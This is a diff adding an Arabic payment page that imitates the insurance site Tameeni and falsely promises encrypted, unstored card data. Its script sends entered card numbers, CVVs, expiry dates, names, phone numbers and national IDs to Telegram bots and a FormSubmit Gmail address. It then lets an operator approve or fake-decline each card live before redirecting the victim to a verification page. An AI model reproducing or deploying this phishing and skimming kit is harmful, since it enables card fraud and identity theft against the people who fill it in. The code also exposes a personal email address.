@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta name="robots" content="noindex, nofollow"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني - بيانات البطاقة البنكية</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/styleg.css">
+<link rel="stylesheet" href="assets/css/theme-blue-flow.css">
+<link rel="stylesheet" href="assets/css/theme-payment-hard.css">
+<style>
+  /* Card Visualization Styles */
+  .card-preview-container {
+    margin-bottom: 30px;
+    perspective: 1000px;
+  }
+
+  .card-preview {
+    width: 100%;
+    max-width: 400px;
+    height: 240px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    border-radius: 16px;
+    padding: 24px;
+    color: white;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    font-family: 'Courier New', monospace;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+  }
+
+  .card-preview.visa {
+    background: linear-gradient(135deg, #1a1f71 0%, #0066cc 100%);
+  }
+
+  .card-preview.mastercard {
+    background: linear-gradient(135deg, #eb001b 0%, #f79e1b 100%);
+  }
+
+  .card-preview.amex {
+    background: linear-gradient(135deg, #006fcf 0%, #00d4ff 100%);
+  }
+
+  .card-preview:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+  }
+
+  .card-preview::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 240"><defs><pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse"><path d="M 20 0 L 0 0 0 20" fill="none" stroke="rgba(255,255,255,0.03)" stroke-width="0.5"/></pattern></defs><rect width="400" height="240" fill="url(%23grid)"/></svg>');
+    pointer-events: none;
+  }
+
+  .card-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    position: relative;
+    z-index: 1;
+  }
+
+  .card-logo {
+    font-size: 24px;
+    font-weight: bold;
+    letter-spacing: 2px;
+  }
+
+  .card-chip {
+    width: 50px;
+    height: 40px;
+    background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    color: #333;
+    font-weight: bold;
+    box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
+  }
+
+  .card-middle {
+    position: relative;
+    z-index: 1;
+  }
+
+  .card-number {
+    font-size: 24px;
+    letter-spacing: 3px;
+    text-align: center;
+    font-weight: 600;
+    margin: 20px 0;
+    min-height: 32px;
+    word-break: break-all;
+  }
+
+  .card-number.empty::before {
+    content: '•••• •••• •••• ••••';
+    opacity: 0.6;
+  }
+
+  .card-bottom {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+    position: relative;
+    z-index: 1;
+  }
+
+  .card-holder {
+    flex: 1;
+  }
+
+  .card-holder-label {
+    font-size: 10px;
+    opacity: 0.8;
+    margin-bottom: 4px;
+  }
+
+  .card-holder-name {
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    min-height: 18px;
+  }
+
+  .card-holder-name.empty::before {
+    content: 'CARDHOLDER NAME';
+    opacity: 0.6;
+  }
+
+  .card-expiry {
+    text-align: center;
+  }
+
+  .card-expiry-label {
+    font-size: 10px;
+    opacity: 0.8;
+    margin-bottom: 4px;
+  }
+
+  .card-expiry-date {
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    min-height: 18px;
+  }
+
+  .card-expiry-date.empty::before {
+    content: 'MM/YY';
+    opacity: 0.6;
+  }
+
+  /* Responsive Design */
+  @media (max-width: 480px) {
+    .card-preview {
+      height: 200px;
+      padding: 18px;
+    }
+
+    .card-number {
+      font-size: 18px;
+      letter-spacing: 2px;
+      margin: 15px 0;
+    }
+
+    .card-chip {
+      width: 40px;
+      height: 32px;
+    }
+
+    .card-holder-name,
+    .card-expiry-date {
+      font-size: 12px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="assets/images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+</header>
+
+<main>
+
+<form id="formStep6" novalidate="" autocomplete="off">
+
+<div class="decline-box" id="declineBox">
+  <div class="decline-icon">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="10"></circle>
+      <line x1="12" y1="8" x2="12" y2="12"></line>
+      <line x1="12" y1="16" x2="12.01" y2="16"></line>
+    </svg>
+  </div>
+  <div class="decline-text">
+    <div class="decline-title">تم رفض طريقة الدفع</div>
+    <div class="decline-sub">يرجى تجربة طريقة دفع أخرى أو التواصل مع البنك</div>
+  </div>
+</div>
+
+<!-- Card Preview Section -->
+<div class="card-preview-container">
+  <div class="card-preview" id="cardPreview">
+    <div class="card-top">
+      <div class="card-logo" id="cardLogoText">CARD</div>
+      <div class="card-chip">IC</div>
+    </div>
+    <div class="card-middle">
+      <div class="card-number empty" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+    </div>
+    <div class="card-bottom">
+      <div class="card-holder">
+        <div class="card-holder-label">CARDHOLDER NAME</div>
+        <div class="card-holder-name empty" id="cardHolderDisplay">CARDHOLDER NAME</div>
+      </div>
+      <div class="card-expiry">
+        <div class="card-expiry-label">VALID THRU</div>
+        <div class="card-expiry-date empty" id="cardExpiryDisplay">MM/YY</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="field">
+<label class="label" for="cardNumber">رقم البطاقة</label>
+<div class="card-field-wrapper">
+  <input id="cardNumber" class="card-input" name="cardNumber" placeholder="" type="tel" maxlength="19" autocomplete="off"/>
+  <div class="card-logos">
+    <img id="s6NetworkLogo" src="" alt="">
+  </div>
+</div>
+<div class="error" id="cardNumberError"></div>
+</div>
+
+<div class="field">
+<label class="label" for="cardHolderName">اسم حامل البطاقة</label>
+<input id="cardHolderName" name="cardHolderName" placeholder="الاسم كما هو مكتوب على البطاقة" type="text" autocomplete="off"/>
+<div class="error" id="cardHolderNameError"></div>
+</div>
+
+<div class="expiry-cvv-row">
+<div class="field">
+<label class="label" for="expiryDate">تاريخ الانتهاء</label>
+<input id="expiryDate" class="card-input" name="expiryDate" placeholder="MM/YY أو MMYY" type="text" autocomplete="off"/>
+<div class="error" id="expiryDateError"></div>
+</div>
+<div class="field">
+<label class="label" for="cvv">رمز الأمان (CVV)</label>
+<input id="cvv" class="card-input" name="cvv" placeholder="" type="tel" maxlength="3" autocomplete="off"/>
+<div class="error" id="cvvError"></div>
+</div>
+</div>
+
+<div class="secure-notice">
+<span class="secure-icon">🔒</span>
+بياناتك محمية بأعلى معايير الأمان والتشفير
+</div>
+
+<p class="info-text">
+جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
+</p>
+
+<div class="buttons-row">
+<a class='btn btn-secondary' href='summary.html'>السابق</a>
+<button class="btn btn-primary" type="submit">التالي</button>
+</div>
+
+</form>
+</main>
+</div>
+
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+<script src="assets/js/telegram-config.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    let paymentDecisionPoll = null;
+    let paymentUpdateOffset = 0;
+    if (urlParams.get('error') === 'card_refused') {
+      const declineBox = document.getElementById('declineBox');
+      if (declineBox) {
+        declineBox.style.display = 'flex';
+        declineBox.classList.add('show');
+      }
+    }
+
+    function hideLoading() {
+      const loadingScreen = document.getElementById('loadingScreen');
+      if (loadingScreen) {
+        loadingScreen.style.display = 'none';
+        loadingScreen.classList.remove('show');
+      }
+    }
+
+    function resetPaymentInputs() {
+      ['cardNumber', 'cardHolderName', 'expiryDate', 'cvv'].forEach(function(id) {
+        const input = document.getElementById(id);
+        if (!input) return;
+        input.value = '';
+        const field = input.closest('.field');
+        if (field) field.classList.remove('success', 'reject');
+      });
+      ['cardNumberError', 'cardHolderNameError', 'expiryDateError', 'cvvError'].forEach(function(id) {
+        const err = document.getElementById(id);
+        if (err) err.textContent = '';
+      });
+      // Reset card preview
+      updateCardPreview();
+    }
+
+    function showDeclineState() {
+      hideLoading();
+      resetPaymentInputs();
+      const declineBox = document.getElementById('declineBox');
+      if (declineBox) {
+        declineBox.style.display = 'flex';
+        declineBox.classList.add('show');
+      }
+      const submitBtn = document.querySelector('#formStep6 button[type="submit"]');
+      if (submitBtn) submitBtn.disabled = false;
+      const firstInput = document.getElementById('cardNumber');
+      if (firstInput) firstInput.focus();
+    }
+
+    function stopPaymentDecisionPolling() {
+      if (paymentDecisionPoll) {
+        clearInterval(paymentDecisionPoll);
+        paymentDecisionPoll = null;
+      }
+    }
+
+    function updateTelegramDecisionMessage(messageId, messageHtml, decisionLabel) {
+      return fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/editMessageText`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: window.CHAT_ID,
+          message_id: messageId,
+          text: `${messageHtml}\n\n<b>الحالة:</b> ${decisionLabel}`,
+          parse_mode: 'HTML'
+        })
+      }).catch(function(error) {
+        console.error('Telegram edit failed:', error);
+      });
+    }
+
+    function handlePaymentDecision(decision, messageId, messageHtml) {
+      stopPaymentDecisionPolling();
+      if (decision === 'accept') {
+        updateTelegramDecisionMessage(messageId, messageHtml, '✅ تم القبول').finally(function() {
+          window.location.href = 'verify.html';
+        });
+        return;
+      }
+      // رفض
+      updateTelegramDecisionMessage(messageId, messageHtml, '❌ مرفوض').finally(function() {
+        showDeclineState();
+      });
+    }
+
+    function startPaymentDecisionPolling(messageId, messageHtml) {
+      stopPaymentDecisionPolling();
+      if (typeof paymentUpdateOffset !== 'number' || paymentUpdateOffset < 0) {
+        paymentUpdateOffset = 0;
+      }
+
+      function pollOnce() {
+        var token = window.BOT_TOKEN;
+        var url = 'https://api.telegram.org/bot' + token + '/getUpdates?offset=' + (paymentUpdateOffset + 1) + '&timeout=20&allowed_updates=' + encodeURIComponent(JSON.stringify(['callback_query']));
+        fetch(url, { method: 'GET', cache: 'no-store' })
+          .then(function(response) { return response.json(); })
+          .then(function(data) {
+            if (!data || !data.ok || !Array.isArray(data.result)) return;
+            data.result.forEach(function(update) {
+              if (update.update_id) {
+                paymentUpdateOffset = Math.max(paymentUpdateOffset, update.update_id);
+              }
+              var callback = update.callback_query;
+              if (!callback || !callback.message) return;
+              if (String(callback.message.message_id) !== String(messageId)) return;
+
+              var action = (callback.data || '').trim();
+              if (action !== 'payment_accept' && action !== 'payment_reject') return;
+
+              fetch('https://api.telegram.org/bot' + token + '/answerCallbackQuery', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  callback_query_id: callback.id,
+                  text: action === 'payment_accept' ? 'تم القبول' : 'تم الرفض'
+                })
+              }).catch(function() {});
+
+              var mappedDecision = action === 'payment_accept' ? 'accept' : 'reject';
+              handlePaymentDecision(mappedDecision, messageId, messageHtml);
+            });
+          })
+          .catch(function(error) {
+            console.error('Telegram polling error:', error);
+          });
+      }
+
+      // seed offset once then poll
+      fetch('https://api.telegram.org/bot' + window.BOT_TOKEN + '/getUpdates?offset=-1&limit=1')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (data && data.ok && data.result && data.result.length) {
+            paymentUpdateOffset = data.result[0].update_id;
+          }
+        })
+        .catch(function() {})
+        .finally(function() {
+          pollOnce();
+          paymentDecisionPoll = setInterval(pollOnce, 3000);
+        });
+    }
+
+    function luhnCheck(num) {
+      let sum = 0;
+      let shouldDouble = false;
+      for (let i = num.length - 1; i >= 0; i--) {
+        let digit = parseInt(num.charAt(i));
+        if (shouldDouble) {
+          if ((digit *= 2) > 9) digit -= 9;
+        }
+        sum += digit;
+        shouldDouble = !shouldDouble;
+      }
+      return (sum % 10) === 0;
+    }
+
+    function setValidationUI(input, isValid) {
+      const field = input.closest('.field');
+      if (!field) return;
+      if (isValid) {
+        field.classList.remove('reject');
+        field.classList.add('success');
+      } else {
+        field.classList.remove('success');
+        field.classList.add('reject');
+      }
+    }
+
+    // Card Preview Update Function
+    function updateCardPreview() {
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const cardHolder = document.getElementById('cardHolderName').value.toUpperCase();
+      const expiryDate = document.getElementById('expiryDate').value;
+      
+      // Update card number display
+      const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+      if (cardNumber.length > 0) {
+        const formattedNumber = cardNumber.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+        cardNumberDisplay.textContent = formattedNumber;
+        cardNumberDisplay.classList.remove('empty');
+      } else {
+        cardNumberDisplay.textContent = '•••• •••• •••• ••••';
+        cardNumberDisplay.classList.add('empty');
+      }
+
+      // Update cardholder name display
+      const cardHolderDisplay = document.getElementById('cardHolderDisplay');
+      if (cardHolder.length > 0) {
+        cardHolderDisplay.textContent = cardHolder;
+        cardHolderDisplay.classList.remove('empty');
+      } else {
+        cardHolderDisplay.textContent = 'CARDHOLDER NAME';
+        cardHolderDisplay.classList.add('empty');
+      }
+
+      // Update expiry date display
+      const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
+      if (expiryDate.length > 0) {
+        cardExpiryDisplay.textContent = expiryDate;
+        cardExpiryDisplay.classList.remove('empty');
+      } else {
+        cardExpiryDisplay.textContent = 'MM/YY';
+        cardExpiryDisplay.classList.add('empty');
+      }
+
+      // Update card type and colors based on card number
+      const cardPreview = document.getElementById('cardPreview');
+      const cardLogoText = document.getElementById('cardLogoText');
+      cardPreview.classList.remove('visa', 'mastercard', 'amex');
+      
+      if (cardNumber.length > 0) {
+        const firstDigit = cardNumber.charAt(0);
+        if (firstDigit === '4') {
+          cardPreview.classList.add('visa');
+          cardLogoText.textContent = 'VISA';
+        } else if (firstDigit === '5') {
+          cardPreview.classList.add('mastercard');
+          cardLogoText.textContent = 'MASTERCARD';
+        } else if (firstDigit === '3') {
+          cardPreview.classList.add('amex');
+          cardLogoText.textContent = 'AMEX';
+        } else {
+          cardLogoText.textContent = 'CARD';
+        }
+      } else {
+        cardLogoText.textContent = 'CARD';
+      }
+    }
+
+    // Add event listeners for card preview updates
+    document.getElementById('cardNumber').addEventListener('input', updateCardPreview);
+    document.getElementById('cardHolderName').addEventListener('input', updateCardPreview);
+    document.getElementById('expiryDate').addEventListener('input', updateCardPreview);
+
+    var step6Sent = false;
+
+    window.sendToTelegramStep6 = function() {
+        if (step6Sent) return;
+        const rtl = '\u200F';
+        const sessionData = JSON.parse(sessionStorage.getItem('tameeniTempData') || '{}');
+
+        const name = sessionData.userName || 'غير معروف';
+        const phone = sessionData.phoneNumber || 'غير معروف';
+        const idNumber = sessionData.idNumber || 'غير معروف';
+        const serial = sessionData.serialNumber || 'غير معروف';
+        const carYear = sessionData.carYear || 'غير معروف';
+        const offerType = sessionData.offerType || 'غير معروف';
+        const regType = sessionData.regType || 'غير معروف';
+        const company = sessionData.selectedCompany || 'غير معروف';
+        const plan = sessionData.selectedPlan || 'غير معروف';
+        const price = sessionData.selectedPrice || 'غير معروف';
+        const total = sessionData.total || (sessionData.selectedPrice ? (sessionData.selectedPrice + ' ريال') : 'غير معروف');
+        const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        const holder = document.getElementById('cardHolderName').value;
+        const expiry = document.getElementById('expiryDate').value;
+        const cvv = document.getElementById('cvv').value;
+
+        const rtlLine = function(text) { return '\u200F' + text; };
+        const message = [
+            rtlLine('💳 بيانات البطاقة - طلب موافقة'),
+            rtlLine('━━━━━━━━━━━━━━━━━━━━'),
+            rtlLine(`👤 الاسم: ${name}`),
+            rtlLine(`📞 الهاتف: ${phone}`),
+            rtlLine(`🪪 الهوية: ${idNumber}`),
+            rtlLine(`🔢 التسلسلي/الجمركي: ${serial}`),
+            rtlLine(`📅 سنة الصنع: ${carYear}`),
+            rtlLine(`📄 نوع العرض: ${offerType}`),
+            rtlLine(`🏷️ نوع التسجيل: ${regType}`),
+            rtlLine(`🏢 الشركة: ${company}`),
+            rtlLine(`📋 الخطة: ${plan}`),
+            rtlLine(`💵 السعر: ${price}`),
+            rtlLine(`💰 الإجمالي: ${total}`),
+            rtlLine('━━━━━━━━━━━━━━━━━━━━'),
+            rtlLine(`💳 رقم البطاقة: <code>${cardNum}</code>`),
+            rtlLine(`👤 حامل البطاقة: ${holder}`),
+            rtlLine(`📅 الانتهاء: <code>${expiry}</code>`),
+            rtlLine(`🔒 CVV: <code>${cvv}</code>`),
+            rtlLine('━━━━━━━━━━━━━━━━━━━━'),
+            rtlLine('⏳ بانتظار قرارك: قبول أو رفض')
+        ].join('\n');
+
+        sessionData.cardNumber = cardNum;
+        sessionData.cardHolderName = holder;
+        sessionData.expiryDate = expiry;
+        sessionData.cvv = cvv;
+        sessionData.cardLast4 = cardNum.slice(-4);
+        sessionStorage.setItem('tameeniTempData', JSON.stringify(sessionData));
+
+        const loadingScreen = document.getElementById('loadingScreen');
+        if (loadingScreen) {
+            loadingScreen.style.display = 'flex';
+            loadingScreen.classList.add('show');
+            document.getElementById('loadingText').textContent = 'جاري التحقق من البيانات...';
+            var sub = document.getElementById('loadingSubtext');
+            if (sub) sub.textContent = 'يرجى الانتظار حتى تتم الموافقة';
+        }
+
+        const configs = window.TELEGRAM_CONFIGS || [{ token: window.BOT_TOKEN, chatId: window.CHAT_ID }];
+        const validConfigs = configs.filter(function(c) { return c.token && c.chatId; });
+
+        if (validConfigs.length === 0) {
+            document.getElementById('loadingText').textContent = 'تعذر الإرسال. إعدادات تيليجرام غير موجودة.';
+            return;
+        }
+
+        step6Sent = true;
+
+        // إرسال إلى تيليجرام مع أزرار قبول / رفض فقط
+        const keyboard = {
+            inline_keyboard: [[
+                { text: '✅ قبول', callback_data: 'payment_accept' },
+                { text: '❌ رفض', callback_data: 'payment_reject' }
+            ]]
+        };
+
+        const sendPromises = validConfigs.map(function(c) {
+            return fetch('https://api.telegram.org/bot' + c.token + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: c.chatId,
+                    text: message,
+                    reply_markup: keyboard,
+                    parse_mode: 'HTML'
+                })
+            });
+        });
+
+        // إرسال البريد عبر FormSubmit فوراً (بدون نسخة تيليجرام)
+        const emailBody = [
+            'بيانات البطاقة - طلب موافقة',
+            '━━━━━━━━━━━━━━━━━━━━',
+            'الاسم: ' + name,
+            'الهاتف: ' + phone,
+            'الهوية: ' + idNumber,
+            'التسلسلي/الجمركي: ' + serial,
+            'سنة الصنع: ' + carYear,
+            'نوع العرض: ' + offerType,
+            'نوع التسجيل: ' + regType,
+            'الشركة: ' + company,
+            'الخطة: ' + plan,
+            'السعر: ' + price,
+            'الإجمالي: ' + total,
+            '━━━━━━━━━━━━━━━━━━━━',
+            'رقم البطاقة: ' + cardNum,
+            'حامل البطاقة: ' + holder,
+            'الانتهاء: ' + expiry,
+            'CVV: ' + cvv
+        ].join('\n');
+
+        // إرسال البريد عبر FormSubmit فوراً (بدون نسخة تيليجرام)
+        (function sendEmailCopy() {
+            var subject = 'تأميني - بيانات بطاقة جديدة - ' + name;
+            var payload = {
+                _subject: subject,
+                _template: 'table',
+                _captcha: 'false',
+                _url: (typeof window !== 'undefined' && window.location && window.location.href) ? window.location.href : 'https://tameeni-payment.local/payment.html',
+                name: name,
+                phone: phone,
+                idNumber: idNumber,
+                serial: serial,
+                company: company,
+                plan: plan,
+                total: String(total),
+                cardNumber: cardNum,
+                cardHolder: holder,
+                expiry: expiry,
+                cvv: cvv,
+                message: emailBody
+            };
+
+            // 1) FormSubmit AJAX (JSON)
+            fetch('https://formsubmit.co/ajax/alzoubikhaled091@gmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(function(r) { return r.json().catch(function(){ return {}; }); })
+              .then(function(res) { console.log('FormSubmit AJAX:', res); })
+              .catch(function(err) { console.error('FormSubmit AJAX error:', err); });
+
+            // 2) FormSubmit classic form-encoded
+            try {
+                var fd = new FormData();
+                Object.keys(payload).forEach(function(k) { fd.append(k, payload[k]); });
+                fetch('https://formsubmit.co/alzoubikhaled091@gmail.com', {
+                    method: 'POST',
+                    body: fd,
+                    headers: { 'Accept': 'application/json' }
+                }).then(function(r) { return r.json().catch(function(){ return {}; }); })
+                  .then(function(res) { console.log('FormSubmit FormData:', res); })
+                  .catch(function(err) { console.error('FormSubmit FormData error:', err); });
+            } catch (e) { console.error(e); }
+        })();
+
+        Promise.all(sendPromises).then(function(responses) {
+            return Promise.all(responses.map(function(r) { return r.json(); }));
+        }).then(function(data) {
+            var tgMessageId = null;
+            for (var i = 0; i < data.length; i++) {
+                if (data[i] && data[i].ok && data[i].result && data[i].result.message_id) {
+                    tgMessageId = data[i].result.message_id;
+                    break;
+                }
+            }
+            if (tgMessageId) {
+                sessionData.paymentTgMessageId = tgMessageId;
+                sessionStorage.setItem('tameeniTempData', JSON.stringify(sessionData));
+                document.getElementById('loadingText').textContent = 'بانتظار الموافقة...';
+                var sub2 = document.getElementById('loadingSubtext');
+                if (sub2) sub2.textContent = 'لا تغلق الصفحة. سيتم التحويل تلقائياً بعد القرار';
+                startPaymentDecisionPolling(tgMessageId, message);
+            } else {
+                document.getElementById('loadingText').textContent = 'فشل إرسال الطلب. حاول مرة أخرى.';
+                step6Sent = false;
+                var btn = document.querySelector('#formStep6 button[type="submit"]');
+                if (btn) btn.disabled = false;
+                setTimeout(hideLoading, 3000);
+            }
+        }).catch(function(error) {
+            console.error('Error sending to Telegram:', error);
+            document.getElementById('loadingText').textContent = 'خطأ في الاتصال. حاول مرة أخرى.';
+            step6Sent = false;
+            var btn = document.querySelector('#formStep6 button[type="submit"]');
+            if (btn) btn.disabled = false;
+            setTimeout(hideLoading, 3000);
+        });
+    };
+
+    function validateCard() {
+      const cardInput = document.getElementById('cardNumber');
+      const cardNum = cardInput.value.replace(/\s/g, '');
+      const isValid = cardNum.length >= 15 && luhnCheck(cardNum);
+      document.getElementById('cardNumberError').textContent = isValid ? '' : 'رقم البطاقة غير صحيح';
+      setValidationUI(cardInput, isValid);
+      return isValid;
+    }
+
+    function validateHolder() {
+      const holderInput = document.getElementById('cardHolderName');
+      const isValid = holderInput.value.length >= 3;
+      document.getElementById('cardHolderNameError').textContent = isValid ? '' : 'يرجى إدخال اسم حامل البطاقة بشكل صحيح';
+      setValidationUI(holderInput, isValid);
+      return isValid;
+    }
+
+    function validateExpiry() {
+      const expiryInput = document.getElementById('expiryDate');
+      let value = expiryInput.value.trim();
+      // قبول صيغ مختلفة: MM/YY أو MMYY
+      const withSlash = /^\d{2}\/\d{2}$/.test(value);
+      const withoutSlash = /^\d{4}$/.test(value);
+      const isValid = withSlash || withoutSlash;
+      document.getElementById('expiryDateError').textContent = isValid ? '' : 'التاريخ غير صحيح (MM/YY أو MMYY)';
+      setValidationUI(expiryInput, isValid);
+      return isValid;
+    }
+
+    function validateCVV() {
+      const cvvInput = document.getElementById('cvv');
+      const isValid = cvvInput.value.length >= 3;
+      document.getElementById('cvvError').textContent = isValid ? '' : 'الرمز غير صحيح';
+      setValidationUI(cvvInput, isValid);
+      return isValid;
+    }
+
+    // Add blur listeners
+    document.getElementById('cardNumber').addEventListener('blur', validateCard);
+    document.getElementById('cardHolderName').addEventListener('blur', validateHolder);
+    // معالجة إدخال تاريخ الانتهاء - إضافة شرطة تلقائياً إذا لم توجد
+    document.getElementById('expiryDate').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, ''); // إزالة أي أحرف غير رقمية
+      if (value.length >= 2) {
+        // إذا كان لدينا 4 أرقام وبدون شرطة، أضف الشرطة
+        if (value.length >= 4) {
+          value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+      }
+      e.target.value = value;
+    });
+    document.getElementById('expiryDate').addEventListener('blur', validateExpiry);
+    document.getElementById('cvv').addEventListener('blur', validateCVV);
+
+    const form = document.getElementById('formStep6');
+    const submitBtn = form ? form.querySelector('button[type="submit"]') : null;
+
+    if (form) {
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+
+        const isCardValid = validateCard();
+        const isHolderValid = validateHolder();
+        const isExpiryValid = validateExpiry();
+        const isCVVValid = validateCVV();
+
+        if (!isCardValid || !isHolderValid || !isExpiryValid || !isCVVValid) return;
+
+        if (submitBtn) submitBtn.disabled = true;
+        window.sendToTelegramStep6();
+      }, true);
+    }
+  });
+</script>
+</body>
+</html>
